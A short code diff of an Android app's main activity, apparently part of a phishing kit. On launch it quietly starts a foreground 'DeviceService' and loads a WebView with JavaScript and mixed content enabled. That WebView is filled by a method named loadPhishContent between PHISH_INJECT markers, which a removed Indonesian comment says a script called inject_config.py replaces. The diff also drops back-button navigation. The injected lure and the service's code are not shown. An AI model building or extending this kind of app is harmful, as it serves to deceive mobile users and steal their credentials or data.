@@ -20,29 +20,23 @@ class MainActivity : AppCompatActivity() {
         setContentView(R.layout.activity_main)
 
         try {
-            val i = Intent(this, DeviceService::class.java)
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                startForegroundService(i)
+            val svc = Intent(this, DeviceService::class.java)
+            if (Build.VERSION.SDK_INT >= 26) {
+                startForegroundService(svc)
             } else {
-                startService(i)
+                startService(svc)
             }
         } catch (_: Exception) {
         }
 
         webView = findViewById(R.id.webview)
-        val s = webView.settings
-        s.javaScriptEnabled = true
-        s.domStorageEnabled = true
-        s.mixedContentMode = WebSettings.MIXED_CONTENT_ALWAYS_ALLOW
-        s.loadWithOverviewMode = true
-        s.useWideViewPort = true
-        s.allowFileAccess = true
+        webView.settings.javaScriptEnabled = true
+        webView.settings.domStorageEnabled = true
+        webView.settings.mixedContentMode = WebSettings.MIXED_CONTENT_ALWAYS_ALLOW
         webView.webViewClient = WebViewClient()
-
         loadPhishContent()
     }
 
-    /** DIGANTI oleh inject_config.py — jangan ubah signature */
     private fun loadPhishContent() {
         // PHISH_INJECT_BEGIN
         try {
@@ -52,12 +46,5 @@ class MainActivity : AppCompatActivity() {
             webView.loadUrl("about:blank")
         }
         // PHISH_INJECT_END
-    }
-
-    @Deprecated("Deprecated in Java")
-    override fun onBackPressed() {
-        if (this::webView.isInitialized && webView.canGoBack()) {
-            webView.goBack()
-        }
     }
 }
